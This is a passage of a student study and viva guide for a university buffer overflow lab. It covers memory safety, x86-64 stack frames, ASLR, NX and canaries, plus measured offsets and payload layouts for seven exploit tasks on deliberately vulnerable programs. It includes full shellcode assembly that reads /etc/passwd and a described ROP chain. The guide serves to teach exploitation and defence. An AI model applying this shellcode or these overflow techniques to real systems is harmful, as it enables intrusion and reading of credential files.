# Buffer Overflow Lab — Complete Study, Presentation & Viva Guide

> **Course:** DD2395/DD2391 Computer Security — Lab O (Buffer Overflow)
> **Scope:** everything in this directory: theory, the seven tasks, the previous agent's
> solutions, why each payload works byte-for-byte, what the defenses do, and the
> questions a strict TA can ask.
>
> Every offset below was re-measured on the binaries in this repository
> (Ubuntu 24.04, GCC 13.3, glibc, x86-64) with GDB, `objdump`, `readelf` and the
> provided `test.py` scripts.

---

## Table of contents

1. [The 60-second summary](#1-the-60-second-summary)
2. [Lab logistics, files, build flags, git history](#2-lab-logistics-files-build-flags-git-history)
3. [Core theory you must be able to explain](#3-core-theory-you-must-be-able-to-explain)
   - 3.1 [What memory safety means](#31-what-memory-safety-means)
   - 3.2 [C objects, arrays, strings and the missing bounds check](#32-c-objects-arrays-strings-and-the-missing-bounds-check)
   - 3.3 [Process memory layout](#33-process-memory-layout)
   - 3.4 [Virtual memory, pages and permissions](#34-virtual-memory-pages-and-permissions)
   - 3.5 [x86-64 registers, instructions and the System V ABI](#35-x86-64-registers-instructions-and-the-system-v-abi)
   - 3.6 [The stack frame, precisely](#36-the-stack-frame-precisely)
   - 3.7 [Buffer over-read vs buffer overflow](#37-buffer-over-read-vs-buffer-overflow)
   - 3.8 [From corruption to exploitation](#38-from-corruption-to-exploitation)
   - 3.9 [Shellcode and the syscall ABI](#39-shellcode-and-the-syscall-abi)
   - 3.10 [Code-reuse attacks and ROP](#310-code-reuse-attacks-and-rop)
   - 3.11 [Defenses: canary, NX/W^X, ASLR/PIE, CFI, shadow stack, RELRO](#311-defenses-canary-nxwx-aslrpie-cfi-shadow-stack-relro)
   - 3.12 [What each defense actually guarantees](#312-what-each-defense-actually-guarantees)
4. [Tooling and methodology](#4-tooling-and-methodology)
5. [Task-by-task deep dive](#5-task-by-task-deep-dive)
   - 5.1 [Task 1 — buffer over-read](#51-task-1--buffer-over-read)
   - 5.2 [Task 2 — buffer overflow / authentication bypass](#52-task-2--buffer-overflow--authentication-bypass)
   - 5.3 [Task 3 — control-flow hijacking to `print_my_pwd`](#53-task-3--control-flow-hijacking-to-print_my_pwd)
   - 5.4 [Task 4 — code injection with shellcode](#54-task-4--code-injection-with-shellcode)
   - 5.5 [Task 5 — partial code reuse inside `check_user`](#55-task-5--partial-code-reuse-inside-check_user)
   - 5.6 [Task 6 — ret2func chain: email then password](#56-task-6--ret2func-chain-email-then-password)
   - 5.7 [Task 7 — full ROP chain in a static binary](#57-task-7--full-rop-chain-in-a-static-binary)
   - 5.8 [The `tutorial/` program](#58-the-tutorial-program)
6. [Cross-task comparison](#6-cross-task-comparison)
7. [Defense matrix for this lab](#7-defense-matrix-for-this-lab)
8. [Viva / exam question bank with answers](#8-viva--exam-question-bank-with-answers)
9. [A 7-minute demo script](#9-a-7-minute-demo-script)
10. [One-page cheat sheet](#10-one-page-cheat-sheet)
11. [Glossary](#11-glossary)
12. [Where each topic comes from in the lecture slides](#12-where-each-topic-comes-from-in-the-lecture-slides)
13. [Appendix A — all measured offsets and addresses](#13-appendix-a--all-measured-offsets-and-addresses)
14. [Appendix B — reproduction log and test evidence](#14-appendix-b--reproduction-log-and-test-evidence)
15. [Appendix C — git history of the solutions](#15-appendix-c--git-history-of-the-solutions)

---

## 1. The 60-second summary

The lab is a sequence of increasingly powerful **memory-safety exploits** against
deliberately vulnerable C programs:

| Task | Vulnerability | What the attacker achieves | Exploitation class |
|---|---|---|---|
| 1 | `write(1, name, n)` with attacker-controlled `n` | reads the neighbouring `pwd` variable | **buffer over-read** / information disclosure |
| 2 | `strcpy(name, argv[1])` into an 8-byte buffer next to `pwd[8]` | changes the stored password and authenticates with a wrong password | **buffer overflow** / data corruption (data-only attack) |
| 3 | `strcpy` in `check_user` overflows a 12-byte buffer and reaches the saved return address | jumps to the existing `print_my_pwd()` function | **control-flow hijack / ret2text** |
| 4 | `gets(mail_body)` overflows a 128-byte stack buffer; stack is executable | returns to injected shellcode that reads `/etc/passwd` | **code injection** |
| 5 | same overflow as task 3 | returns *into the middle* of `check_user`, at the instruction sequence that does `puts(pwd)`, bypassing the password check | **partial code reuse / ret2code** |
| 6 | `fread(content, length, 1, f)` with attacker-controlled length | return-address chain calls `printEmail()` and then `printPwd()` | **ret2func chain (lightweight ROP)** |
| 7 | same `fread` overflow, but binary is static and NX-protected | ROP chain `pop rdi; pop rbp; ret` + `puts` prints the global `pwd` string | **full ROP** |

The recurring theme from the lectures:

> A buffer overflow is caused by a programming error that lets more data be stored
> than the capacity of an object (or read more than its capacity). The overflow
> corrupts adjacent memory, which can corrupt program data, cause an unexpected
> transfer of control, crash the program, or execute code chosen by the attacker.
> — *Memory Safety* slides 1–3

Three sentences that cover the whole lab:

1. **C does not check bounds.** `strcpy`, `gets`, `fread` and `write` trust the
   programmer; the programmer (here) does not validate lengths.
2. **The stack frame mixes data and control metadata.** Local buffers sit below the
   saved frame pointer and the saved return address, so a long write walks *up* the
   stack and overwrites control data (return address) or neighbouring secrets.
3. **The exploit is just a crafted byte string.** The attacker only needs to know
   the layout (offsets) and, when code addresses are randomized, one leaked address
   from which every other address in the same image can be computed.

**If the TA says "explain your lab in one minute", say this:** "The first task is an
over-read: `write` prints `n` bytes from an 8-byte name, and `pwd` is the next 8
bytes on the stack, so `hello 16` leaks it. The second is a local overflow:
`strcpy` writes 11 characters plus a NUL into `name[8]`, overwriting the adjacent
`pwd` with `XXX`, so the program authenticates with the wrong password. The rest are
control-flow exploits: in each one I measured the distance from a local buffer to
the saved return address, built a payload from that offset, and replaced the return
address with either `print_my_pwd` (task 3), a `puts(pwd)` instruction inside
`check_user` (task 5), the addresses of `printEmail` and `printPwd` (task 6), or a
`pop rdi; pop rbp; ret` gadget followed by `puts` (task 7). Task 4 is the only code
injection: the stack is executable, so the return address points to 82 bytes of
shellcode that read `/etc/passwd`. The ASLR leaks in the DEBUG output let me compute
the runtime addresses from fixed offsets; the tests pass, and the crashes after the
leaks are expected."


---


## 2. Lab logistics, files, build flags, git history

### 2.1 Directory map

```
buffer-overflow/
├── Makefile                  # builds/tests task1..task7
├── README.md                 # original lab instructions + GDB tutorial
├── lectures/                 # course slides (Memory Safety, System Security, Spectre, ...)
├── tutorial/                 # small GDB demo program
├── task1/ ... task7/         # one vulnerable program per task
│   ├── main.c                # vulnerable source
│   ├── Makefile              # build flags
│   ├── test.py               # automatic grader
│   ├── solutionN.txt/.py     # the solution
│   └── main.elf              # compiled binary (not tracked: *.elf in .gitignore)
└── BUFFER_OVERFLOW_LAB_GUIDE.md   # this document
```

### 2.2 Build flags — and why each one matters

| Task | Compile flags | Consequence |
|---|---|---|
| 1, 2, 3, 5, 6 | `-O0 -ggdb -fno-stack-protector` | no optimisation (variables stay on the stack, debug symbols for GDB), **no stack canary** |
| 4 | `-fno-stack-protector -z execstack -O0 -ggdb` | additionally makes the stack **executable** (`GNU_STACK ... RWE`), needed for code injection |
| 7 | `-static -O0 -ggdb -fno-stack-protector` | statically linked (libc code is inside the binary, giving many gadgets) and **non-PIE** (`Type: EXEC`), so code addresses are fixed |

All non-static binaries are built as **PIE** (`Type: DYN`) by the Ubuntu GCC
default. That matters: `main` moves on every run, which is why tasks 3–7 print
`main` (or a stack address) to `stderr`.

Useful verification commands:

```bash
readelf -h task3/main.elf | grep Type          # DYN  -> PIE
readelf -h task7/main.elf | grep Type          # EXEC -> non-PIE, static
readelf -l task4/main.elf | grep -A1 GNU_STACK # RWE  -> executable stack
readelf -l task3/main.elf | grep -A1 GNU_STACK # RW   -> NX stack
readelf -s task3/main.elf | grep stack_chk     # empty -> no canary call
cat /proc/sys/kernel/randomize_va_space         # 2    -> full ASLR
```

Caveat: in the static task 7 binary, `grep stack_chk` finds libc's
`__stack_chk_fail` symbol because the whole C library is linked in, even though
`process()` has no canary check (compile flag `-fno-stack-protector`). For task 7,
confirm by disassembling `process` (no `fs:0x28` load/store) rather than by symbol
presence.

### 2.3 Running the tests

Each task's `Makefile` has `test`, and most have `attack`:

```bash
make -C task1 test     # or: cd task1 && ./test.py
make -C task4 attack   # runs ./solution4.py < my.fifo | ./main.elf 2>my.fifo
```

`test.py` uses `subprocess.check_output("unbuffer make attack", shell=True)`.
`unbuffer` (from the `expect` package) gives the child a pseudo-terminal, so
`stdout` is **line-buffered** and the leaked password is not lost when the process
crashes after the leak. Without `unbuffer`, stdout is a pipe and fully buffered;
`puts("pwd0")` may still be sitting in libc's buffer when the process segfaults,
and you see no output. This is a real, frequently asked detail.

The README warns that a correct solution may still fail occasionally because of
ASLR. The reason is that payload addresses are random; if a random address byte is
`0x0a` (newline), `gets()` stops early. Rerun two or three times.

### 2.4 Git history of the previous agent's work

`git log --oneline --all` in the parent repository shows:

```
82e405b test7 ok all done
18b1e76 test6 ok
b7c62b8 test5 ok
c7e6eec task4 ok
07e5d96 test3 ok
b8a58b3 test ok
bb93a72 Done with task 1
338fcc3 changed gitignore
ffb53a1 added folder from school
```

What each commit changed (from `git show`):

| Commit | Change | Meaning |
|---|---|---|
| `bb93a72` | `task1/solution1.txt`: `hello 5` → `hello 16` | 5 bytes only echoes the name; 16 bytes also reads `pwd` |
| `b8a58b3` | `task2/solution2.txt`: `hello 12345` → `AAAAAAAAXXX XXX` | overflow `name[8]` so that `pwd` becomes `XXX`, then pass `XXX` |
| `07e5d96` | `task3/solution3.py`: template → `-160` / `20` / payload | `print_my_pwd = main - 160`, return address 20 bytes after `name` |
| `c7e6eec` | `task4/solution4.py`: shellcode + `subject-128` + `168` | body at `subject-128`, return address 168 bytes into body |
| `b7c62b8` | `task5/solution5.py`: `main-22` + `20` | jump to the `puts(pwd)` instruction sequence inside `check_user` |
| `18b1e76` | `task6/solution6.py`: `-192` / `-238` + `24` | chain `printEmail` then `printPwd` |
| `82e405b` | `task7/solution7.py`: ROP offsets + chain | `pop rdi; pop rbp; ret` + dummy + `ret` + `puts` |

The initial files were templates that only wrote benign input
(`writeStr("Name\n")`, `writeStr("Password\n")`, etc.); each later commit replaced
the template with the actual measured offsets and payload construction.

---


## 3. Core theory you must be able to explain

### 3.1 What memory safety means

A program is **memory safe** if every memory access is valid: it stays inside an
object that is alive, with the correct type, and with the permissions the language
promises. C and C++ are **not** memory safe. They give you raw pointers, unchecked
array indexing, manual allocation/deallocation and no lifetime tracking. The
lecture lists the consequences of violating memory safety (*Memory Safety* slide 3,
*System Security* slide 2):

- **access to secret data** (over-read; Heartbleed is the canonical example),
- **corruption of program data** (change a password, a length, a flag),
- **unexpected transfer of control** (overwrite a return address or function pointer),
- **memory access violation** (segmentation fault),
- **execution of code chosen by the attacker** (shellcode, ROP).

Real-world examples named in the lectures: the Morris Worm (stack overflow),
Heartbleed (OpenSSL over-read), Stagefright (Android media stack), and the Xbox
font-loader savegame exploits. The lecture's point is that these bugs appear even in
well-designed, widely reviewed systems, and that a huge amount of legacy C/C++ code
is still deployed.

### 3.2 C objects, arrays, strings and the missing bounds check

In C, an object is a region of storage with a type and a size. An array is a
contiguous sequence of elements; **there is no length stored with the array** and
`a[i]` does not check `i`. A C string is just a `char` array whose end is marked by
a **NUL byte** (`'\0'`, value 0). The length of the string is not stored; every
string function scans until it finds that zero.

This creates two distinct failure modes:

- **Writing past the end** — `strcpy`, `gets`, `sprintf`, `fread`, `memcpy`,
  `write` with a wrong length, a loop with `<=` instead of `<`.
- **Reading past the end** — `printf("%s", buf)` when `buf` has no NUL, `write` with
  a length larger than the object, `strlen` on a non-terminated buffer, Heartbleed's
  `memcpy` with an attacker-supplied length.

The functions in this lab and their exact contracts:

| Function | Signature / use here | Why it is dangerous |
|---|---|---|
| `strcpy(dst, src)` | copies until `'\0'`, **then writes the `'\0'`** | no destination size; one byte more than the visible string is written |
| `gets(buf)` | reads a whole line from `stdin`, replaces newline with `'\0'` | no size parameter at all; impossible to use safely; removed from C11 and modern headers, which is why the source manually declares `char *gets(char *)` |
| `strcmp(a, b)` | returns 0 iff equal | stops at first difference/NUL; used as the authentication decision here |
| `fread(ptr, size, nmemb, f)` | reads `size * nmemb` bytes | no knowledge of `ptr`'s capacity; does **not** append `'\0'` |
| `write(fd, buf, count)` | raw kernel write of `count` bytes | no bounds check, writes NULs and binary data too |
| `printf("%s", p)` | prints until NUL | over-reads if no NUL; unlike `write`, stops at the first zero |
| `atoi(s)` | decimal to int | no error checking; `n` is fully attacker-controlled |

A subtle but important point: **`strcpy` writes `strlen(src)+1` bytes**, not
`strlen(src)`. In task 2 the extra terminating NUL is exactly what makes the
overwritten password a valid, terminated C string.

---


### 3.3 Process memory layout

A running Linux process has these mappings (low addresses to high addresses on
x86-64):

```
0x0000000000400000  .text        program code (read + execute)
                    .rodata      string literals, constants (read only)
                    .data        initialised globals (read + write)
                    .bss         zero-initialised globals (read + write)
                    heap         malloc/new, grows upward
                    ...          shared libraries / mmap region (libc, loader)
0x7ffffffff000      stack        local variables, frames, grows downward
0x7fffffffffff      argv/envp, auxv at the very top
```

Key facts:

- `pwd = "pwd0"` is a **global pointer variable** in `.data`/`.data.rel.ro`; the
  characters `"pwd0"` live in `.rodata`. The pointer variable stores the address of
  the string, so there are two levels of indirection.
- Local variables live on the **stack**. On x86-64 the stack grows **downward**:
  `push` decrements `rsp`, `call` pushes the return address, a function's locals are
  at negative offsets from `rbp`.
- A buffer overflow writes from a low address to a high address (because C arrays
  are indexed upward), so from a local buffer it walks toward the saved frame
  pointer and saved return address. That is the entire basis of tasks 3–7.
- The heap grows upward from low addresses, but heap overflow is a different attack
  (function pointers, allocator metadata); this lab uses stack buffers.

The lecture (*Memory Safety* slides 7–8, 21–22) shows the same layout with concrete
addresses: global `0x601054`, stack `0x7ffffffffdcfc`, heap `0x602010`, code
`0x4005f6`, libc `0x4004f0`.

### 3.4 Virtual memory, pages and permissions

The **MMU** (Memory Management Unit) translates virtual addresses to physical
addresses using page tables configured by the OS. Each page has permission bits:
read, write, execute, user/kernel. This is what makes the following defenses
possible:

- **NX / W^X**: a page is either writable or executable, not both. The stack and
  heap are `RW`, code is `RX`. `-z execstack` in task 4 deliberately makes the stack
  `RWE`, disabling NX for the stack.
- **Guard pages**: a page marked inaccessible placed next to a buffer; any access
  aborts the process. The lecture (*System Security* slide 14) suggests guard pages
  between stack frames, heap buffers and critical regions. Linux does not put a
  guard page between every stack frame, which is why a 20-byte overflow silently
  corrupts the frame instead of faulting.
- **ASLR** randomizes the virtual base addresses of mappings (stack, heap, mmap,
  PIE executable) so the attacker cannot hard-code them.

The permission check happens on every access; a segmentation fault is the MMU
saying "this virtual address is not mapped, or you lack the permission". A
**Bus error** (seen in task 5) is typically a misaligned access or an access to a
mapped but invalid address; both are signs that the hijacked control flow led to
garbage.

---


### 3.5 x86-64 registers, instructions and the System V ABI

**Registers you must know:**

| Register | Role in this lab |
|---|---|
| `rip` | instruction pointer (program counter); `ret` loads it from the stack |
| `rsp` | stack pointer; points to the top (lowest address) of the current stack |
| `rbp` | frame pointer; stable base for locals, saved at `[rbp]` |
| `rax` | return value; also syscall number |
| `rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9` | 1st–6th integer arguments (System V AMD64) |
| `rbx`, `r12`–`r15` | callee-saved; a function that uses them must restore them |

**Instructions used in the disassembly:**

| Instruction | Effect |
|---|---|
| `push rbp` | `rsp -= 8; [rsp] = rbp` |
| `mov rbp, rsp` | frame pointer = current stack pointer |
| `sub rsp, 0x20` | allocate 32 bytes of locals |
| `lea rax, [rbp-0xc]` | `rax = rbp - 12` (address of a local; no memory access) |
| `mov rax, [rbp-0x18]` | load 8 bytes from memory |
| `mov [rbp-0x18], rdi` | store 8 bytes to memory |
| `mov rax, [rip+0x2df9]` | RIP-relative load: address = next instruction + displacement |
| `call target` | `rsp -= 8; [rsp] = rip_next; rip = target` |
| `ret` | `rip = [rsp]; rsp += 8` |
| `leave` | `rsp = rbp; rbp = [rsp]; rsp += 8` (i.e. `mov rsp,rbp; pop rbp`) |
| `syscall` | kernel entry; number in `rax`, args in `rdi/rsi/rdx/...` |
| `endbr64` | CET indirect-branch landing pad; behaves like a NOP here |

**Calling convention (System V AMD64):**

- Integer/pointer arguments: `rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`, then the stack.
- Return value: `rax` (and `rdx` for some 128-bit values).
- `rbp`, `rbx`, `r12`–`r15` are **callee-saved**: the callee must restore them.
- At the moment of a `call`, `rsp` must be 16-byte aligned; therefore at the first
  instruction of the callee `rsp % 16 == 8` (because `call` pushed 8 bytes).
  This is why ROP chains sometimes insert an extra `ret` gadget: it shifts `rsp`
  by 8 to restore the convention before calling a libc function. Whether it is
  needed depends on the callee; see the task 7 discussion.

**Little-endian:** x86-64 stores the least significant byte first. The 64-bit
address `0x0000560db2e301e9` is the byte sequence:

```
e9 01 e3 b2 0d 56 00 00
```

That is why all payloads use `addr.to_bytes(8, 'little')`. If you wrote the bytes
in the wrong order, the CPU would jump to `0xe901e3b20d560000` and crash.

**PIE and RIP-relative addressing:** in a PIE, the compiler cannot use absolute
addresses; it uses `lea rax, [rip+disp]` or `mov rax, [rip+disp]`. The displacement
is fixed, but the base is randomized. This is why a single leaked address (e.g.
`main`) lets you compute every other address in the same image: all offsets between
symbols are fixed. `runtime_addr = load_base + static_offset`; subtracting two
symbols cancels the base.

### 3.6 The stack frame, precisely

When `main` calls `check_user(name, pass)` the machine does this:

```
main's frame                     check_user's frame
high addresses
+------------------+  <- main's rbp
| main's locals    |
| ...              |
| saved rip        |  <- return address into main
+------------------+  <- rsp before call
| argument 2       |  (or in rsi; on x86-64 first 6 args are in registers)
| argument 1       |
+------------------+
| saved rbp        |  <- [check_user's rbp]
| saved rip        |  <- [check_user's rbp + 8]  <-- overwrite target
| local name[12]   |  <- [rbp - 0xc]
| padding          |
| ...              |
+------------------+  <- check_user's rsp
low addresses
```

The compiler's prologue for `check_user` (from `objdump`):

```asm
1212: endbr64
1216: push rbp                 ; save caller's rbp
1217: mov rbp, rsp             ; establish frame
121a: sub rsp, 0x20            ; 32 bytes of locals
121e: mov [rbp-0x18], rdi      ; uname
1222: mov [rbp-0x20], rsi      ; upwd
1226: mov rdx, [rbp-0x18]
122a: lea rax, [rbp-0xc]       ; &name
1231: mov rdi, rax
1234: call strcpy
...
1287: leave                    ; mov rsp,rbp; pop rbp
1288: ret                      ; pop saved rip
```

The epilogue is exactly the inverse. The **saved return address** is the value
that `ret` pops; overwriting it is control-flow hijacking.

Measured frames (GDB, ASLR disabled; relative offsets are what matter):

| Task/function | `rbp` | buffer | saved `rbp` | saved `rip` | distance buffer → saved `rip` |
|---|---|---|---|---|---|
| task1 `main` | `...e0b0` | `name` `...e09c` (8 B) | — | — | `pwd` is at `...e0a4` (8 bytes after `name`) |
| task2 `main` | `...e0a0` | `name` `...e090` (8 B) | `...e0a0` | `...e0a8` | `pwd` at `...e098` (8 bytes after `name`) |
| task3 `check_user` | `...dfa0` | `name` `...df94` (12 B) | `...dfa0` | `...dfa8` | **20** |
| task4 `get_mail` | `...e0a0` | `body` `...e000` (128 B), `subject` `...e080` (32 B) | `...e0a0` | `...e0a8` | **168** (`128 + 32 + 8`) |
| task5 `check_user` | `...dfa0` | `name` `...df94` (12 B) | `...dfa0` | `...dfa8` | **20** |
| task6 `process` | `...e020` | `content` `...e010` (12 B) | `...e020` | `...e028` | **24** (`12 + 4 length + 8`) |
| task7 `process` | `...e030` | `content` `...e020` (12 B) | `...e030` | `...e038` | **24** |

Notes:

- The gap is not always the declared buffer size. The compiler adds alignment
  padding and may place other locals in between (`length` in tasks 6/7, `subject` in
  task 4). This is why you **measure**, not guess.
- Overwriting saved `rbp` alone usually does not immediately crash; the crash happens
  when the function executes `leave` and uses the corrupted `rbp`, or when a later
  `ret` uses a corrupted stack. In task 3 the payload fills saved `rbp` with `A`s,
  which is why the program crashes *after* printing the password.
- In task 6, the values after the return address are consumed as the next "frames"
  of the chain; the `pop rbp` in `printEmail`/`printPwd` pops them, so the chain
  layout must account for the prologue/epilogue of each called function.

---


### 3.7 Buffer over-read vs buffer overflow

| | **Buffer over-read** | **Buffer overflow (over-write)** |
|---|---|---|
| Direction | reads beyond the object | writes beyond the object |
| Violates | **confidentiality** (leaks memory) | **integrity**; can become **control-flow integrity** |
| Typical bug | wrong length, missing NUL, `write` with attacker length | `strcpy`, `gets`, `fread`, `memcpy` without bounds |
| Lab example | task 1 (`write(1, name, n)`) | tasks 2–7 |
| Heartbleed analogue | yes: server echoes more memory than the request length | no |
| Fix | cap the length; stop at NUL; validate | cap the length; use bounded copy; validate |

A common misconception is that over-read is "less serious". It is not: leaking a
password, a canary, a pointer or the PIE base is often the step that makes a
control-flow exploit possible. The lecture shows exactly this with
`./main roberto 16` printing `pwd0` and with Heartbleed (*Memory Safety* slides 4–6).
In this lab, task 1 is pure over-read, and tasks 3–7 use leaks (of `main` or of a
stack address) to defeat ASLR.

Task 2 is an overflow but **not** a control-flow hijack: it only corrupts another
local variable (`pwd`), which is why it is called a **data-only attack**. It never
touches saved `rbp`/`rip`. This distinction matters for the defense discussion: a
stack canary protects control metadata, not arbitrary local data.

### 3.8 From corruption to exploitation

The lecture (*Memory Safety* slide 19) says an attacker must:

1. **identify** the overflow (source inspection, binary inspection, tracing, fuzzing),
2. **understand the memory layout** (offsets, what is adjacent),
3. **determine the effect** of corruption (which bytes control what).

For a control-flow exploit you then need:

- **a target address**: a function (`print_my_pwd`), an instruction inside a
  function (the `puts(pwd)` sequence), or a gadget (`pop rdi; ret`);
- **the address of that target at runtime** — either fixed (non-PIE) or computed
  from a leak;
- **a payload layout**: padding to the saved `rip`, then the target address, then
  any data the target/chain will consume;
- **a delivery channel** that preserves the bytes (argv, stdin, file, network).

Exploit classes, from simplest to most general:

| Class | Idea | Lab task |
|---|---|---|
| **Data-only** | change a variable, length, flag or pointer, never hijack control | task 2 |
| **ret2text** | overwrite `rip` with the address of an existing function | task 3 |
| **ret2code / partial reuse** | overwrite `rip` with an address *inside* a function, skipping checks | task 5 |
| **ret2func chain** | return to function A, whose `ret` returns to function B, etc. | task 6 |
| **code injection** | put machine code in a writable+executable buffer, return to it | task 4 |
| **ROP** | chain small instruction sequences ("gadgets") ending in `ret`; Turing-complete in principle | task 7 |

Two practical requirements:

- **ASLR**: PIE randomizes the executable base. Without a leak you would have to
  guess ~28 bits (impractical); with one leaked code pointer, every offset in the
  same image is known. Tasks 3, 5, 6 and 7 leak `main`; task 4 leaks the address of
  a stack buffer because it needs the stack, not the code.
- **NX**: if the stack is non-executable, ret2text/ret2func/ROP still work because
  they reuse existing code; only code injection is blocked. That is the whole reason
  task 7 uses ROP instead of shellcode.

---


### 3.9 Shellcode and the syscall ABI

**Shellcode** is a small, self-contained machine-code payload that the attacker
injects and then executes. The lecture (*Memory Safety* slides 36–37) lists the
requirements:

- it must **marshal the arguments** for the system call (e.g. the path `/etc/passwd`
  or `/bin/sh`);
- it must contain the code to invoke the kernel;
- it must be **position-independent** (no absolute addresses, because the attacker
  does not know where it will land);
- it should **not contain NUL bytes** if it travels through a C string function,
  because NUL terminates the string.

x86-64 Linux syscall convention:

| `rax` | syscall | arguments |
|---|---|---|
| 0 | `read` | `rdi` fd, `rsi` buffer, `rdx` count |
| 1 | `write` | `rdi` fd, `rsi` buffer, `rdx` count |
| 2 | `open` | `rdi` path, `rsi` flags, `rdx` mode |
| 59 | `execve` | `rdi` path, `rsi` argv, `rdx` envp |
| 60 | `exit` | `rdi` status |

The task 4 shellcode (`task4/shell.asm`, 82 bytes, no NUL and no newline) is:

```asm
_start:
  jmp _push_filename
_readfile:
  pop rdi                    ; rdi = address of the path string
  xor byte [rdi + 11], 0x41  ; 'A' (0x41) -> 0x00: terminate "/etc/passwd"
  xor rax, rax
  add al, 2                  ; rax = 2 (open)
  xor rsi, rsi               ; O_RDONLY = 0
  syscall                    ; open("/etc/passwd", O_RDONLY)
  sub sp, 0xfff              ; reserve 4095 bytes on the stack
  lea rsi, [rsp]             ; read buffer = rsp
  mov rdi, rax               ; fd returned by open
  xor rdx, rdx
  mov dx, 0xfff              ; count = 4095
  xor rax, rax               ; rax = 0 (read)
  syscall                    ; read(fd, rsp, 4095)
  xor rdi, rdi
  add dil, 1                 ; rdi = 1 (stdout)
  mov rdx, rax               ; count = bytes read
  xor rax, rax
  add al, 1                  ; rax = 1 (write)
  syscall                    ; write(1, rsp, count)
  xor rax, rax
  add al, 60                 ; rax = 60 (exit)
  syscall                    ; exit(rdi) -- rdi is still 1
_push_filename:
  call _readfile             ; pushes the address of `path`
path:
  db "/etc/passwdA"          ; the A is a placeholder for the NUL
```

Why the `jmp`/`call`/`pop` dance? `call` pushes the address of the next
instruction (the path) onto the stack; `pop rdi` retrieves it. That gives a
position-independent pointer without embedding an absolute address. The `A` at the
end avoids a NUL in the payload; the `xor` turns it into the terminator at runtime.

Note the README says the shellcode "invokes `exec` and executes `cat /etc/passwd`",
but the actual `shell.asm` does not exec anything: it uses `open`/`read`/`write`
directly. Say the accurate version: it reads `/etc/passwd` with syscalls. Also note
the exit status is 1 (because `rdi` is 1 at `exit`), so `make attack` reports
`Error 1` even though the attack succeeded; `test.py` checks the output and passes.

### 3.10 Code-reuse attacks and ROP

**Return-Oriented Programming (ROP)** is the answer to NX. Instead of injecting new
code, the attacker reuses existing instruction sequences. The lecture
(*Memory Safety* slides 49–62) defines:

- a **gadget** is a short instruction sequence ending in an indirect transfer of
  control, usually `ret`;
- gadgets live inside the existing program (or its libraries);
- the attacker writes a **chain** of gadget addresses on the stack;
- each `ret` pops the next gadget address and jumps to it, so the CPU executes the
  attacker's chosen sequence of existing instructions.

The canonical gadget is `pop rdi; ret`: it loads the next 8 bytes from the stack into
`rdi` (the first argument register) and then returns to the following stack entry.
With a `pop rdi; ret` gadget plus a call to `puts`, an attacker can call
`puts(any_address)` without writing any code.

Important subtleties:

- **Gadgets can start mid-instruction.** The task 7 gadget is at `0x4334b8`, which is
  *inside* the instruction `41 5f` (`pop r15`) at `0x4334b7`. The bytes at `0x4334b8`
  are `5f 5d c3` = `pop rdi; pop rbp; ret`. x86 has variable-length instructions, so
  any byte offset can be a valid gadget. `objdump` shows the "intended" instruction,
  not the gadget; use `r2`/`ROPgadget` or disassemble at the gadget address.
- **Each gadget must end in a usable transfer.** `pop rdi; pop rbp; ret` consumes two
  stack slots: the value for `rdi` and a dummy for `rbp`. Forgetting the dummy shifts
  the whole chain.
- **Stack alignment.** libc functions may use SSE instructions that require 16-byte
  alignment. A `ret` gadget can shift `rsp` by 8 to adjust it. In task 7 the author
  inserted one; see the measured caveat in §5.7.
- **Register state matters.** The chain must set up `rdi` (argument) before calling
  `puts`; `rax`, `rsi`, `rdx` may be clobbered, so do not rely on them.
- **ASLR** randomizes the gadget addresses if the binary/library is PIE; a leak is
  needed. In task 7 the binary is static non-PIE, so gadget addresses are fixed.

---


### 3.11 Defenses: canary, NX/W^X, ASLR/PIE, CFI, shadow stack, RELRO

The lecture (*System Security* slides 5–47) groups defenses into **compile-time**,
**run-time** and **hardware-based**. Here is the full list with the details you need.

#### Stack canary (stack protector)

The compiler inserts a random value (the **canary**) between the local variables and
the saved frame pointer/return address. The function prologue stores it, and the
epilogue checks it before `ret`; if the value changed, `__stack_chk_fail` aborts the
process. GCC options: `-fstack-protector` (functions with arrays/allocas),
`-fstack-protector-strong` (more functions), `-fstack-protector-all` (all).
The lab uses **`-fno-stack-protector`**, so no canary is present.

Why it works: an overflow that walks from a local buffer toward `rip` must cross the
canary and overwrite it. The attacker cannot guess the 64-bit random value, so the
check fails. Limitations:

- it detects but does not prevent the corruption; the process still aborts
  (availability impact);
- a **data-only** attack that stays below the canary (task 2) is unaffected;
- an over-read can leak the canary;
- a write that skips the canary (e.g. an arbitrary write primitive, or a different
  object) is unaffected;
- it protects returns, not arbitrary function pointers or data.

Stack layout with a canary (lecture slides 25–26):

```
[higher addresses]
saved rip
saved rbp
CANARY              <-- random, checked on return
local buffer
...
[lower addresses]
```

#### NX / W^X / executable address space protection

The MMU marks stack and heap `RW` (not executable), code `RX`. Then injected
shellcode on the stack cannot execute: the CPU raises a protection fault. On Linux
the `GNU_STACK` program header controls this; `-z execstack` makes it `RWE`.
Defenses are usually called **NX** (No-eXecute), **DEP** (Data Execution Prevention)
or **W^X**. Limitations: it does not stop **code reuse** (ret2text, ret2func, ROP);
an attacker can sometimes call `mprotect` via ROP to make a page executable
(*System Security* slide 37); JIT engines need writable+executable pages and need
special policies.

Task 4 explicitly disables NX with `-z execstack`; all other tasks keep NX, which is
why tasks 3/5/6/7 reuse code instead of injecting it.

#### ASLR and PIE

**ASLR** (Address Space Layout Randomization) randomizes the base addresses of
mappings. Linux `randomize_va_space=2` randomizes stack, heap, mmap/shared libraries
and (with PIE) the main executable. **PIE** (Position-Independent Executable) is
required for the main executable to be relocated; `readelf -h` shows `DYN` instead
of `EXEC`.

The crucial property: **offsets inside one image are fixed**; only the base moves.
So one leaked address defeats ASLR for that image:

```
runtime_main   = base + static_main
runtime_target = base + static_target
runtime_target = runtime_main + (static_target - static_main)
```

The lecture (*Spectre* slides 4, 9–10) notes: ASLR complicates exploitation but does
not enforce valid control flow; an address disclosure (debug output, over-read, side
channel) can reveal the base; non-PIE binaries have fixed code addresses. Task 7 is
static non-PIE, so its code/gadget addresses are fixed even though the stack is
randomized.

ASLR limitations: information leaks, guessing/brute force (especially 32-bit),
relative overwrites (partial pointer overwrite), and the fact that it does not stop
data-only attacks.

#### RELRO

**RELRO** (Relocation Read-Only) makes parts of the GOT/`.dynamic` read-only after
relocation, to prevent GOT overwrites. `-Wl,-z,relro,-z,now` ("full RELRO") resolves
all symbols at load time and marks the GOT read-only. This lab does not attack the
GOT, so RELRO is not central; mention it if asked about other control-flow targets.
`readelf -d` shows `BIND_NOW`/`FLAGS: NOW PIE` for task 3.

---


#### CFI and shadow stacks

